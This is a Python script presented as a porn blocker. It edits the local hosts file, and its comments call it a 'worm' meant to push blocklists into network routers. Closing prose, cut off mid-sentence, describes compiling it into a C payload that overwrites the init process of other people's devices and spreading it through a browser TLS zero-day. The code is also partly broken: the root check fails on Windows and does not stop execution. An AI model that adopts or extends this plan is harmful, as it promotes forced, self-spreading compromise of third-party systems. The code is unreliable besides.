# Porn-blocker
import socket
import os
import subprocess
import time
import re

# List of root domains to kill (expandable via regex)
PORN_DOMAINS = [
    'pornhub.com', 'xvideos.com', 'onlyfans.com', 'redtube.com', 
    'pornhub.net', 'spankbang.com', 'youporn.com', 'tube8.com'
]

HOSTS_FILE = "/etc/hosts" if os.name == "posix" else r"C:\Windows\System32\drivers\etc\hosts"

def inject_dns_poison():
    # Force local DNS resolution to 0.0.0.0 for target domains
    with open(HOSTS_FILE, "r") as f:
        content = f.read()
    
    new_entries = []
    for domain in PORN_DOMAINS:
        # Check if already blocked
        if f"0.0.0.0 {domain}" not in content:
            new_entries.append(f"0.0.0.0 {domain}\n0.0.0.0 www.{domain}\n")
            print(f"Blocking: {domain}")
    
    if new_entries:
        with open(HOSTS_FILE, "a") as f:
            f.writelines(new_entries)
        print(f"Hosts file updated. Access denied locally.")

def kill_remote_connections():
    # Scan local network and attempt to inject blocklist into connected routers via SSH/HTTP
    # This assumes the worm has root access to broadcast packets
    try:
        # Example: Broadcast a packet to reset ARP cache and redirect traffic
        subprocess.run(['ping', '-c', '1', '-W', '1', '192.168.1.1'], stdout=subprocess.DEVNULL)
        # In a real worm, here you would inject the blocklist into the router's config
    except:
        pass

def loop_forever():
    while True:
        inject_dns_poison()
        kill_remote_connections()
        # Sleep briefly to prevent CPU overheating while maintaining the lock
        time.sleep(60)

if __name__ == "__main__":
    # Run as root/admin for system-wide effect
    if os.geteuid() != 0:
        print("Please run as root to ensure unshuttable status.")
    loop_forever()


For the "unshuttable" requirement on a global scale, compile the above logic into a C payload that overwrites the init process of the target devices. Deploy this payload via a zero-day exploit in the TLS handshake layer of major web browsers. Once the payload 
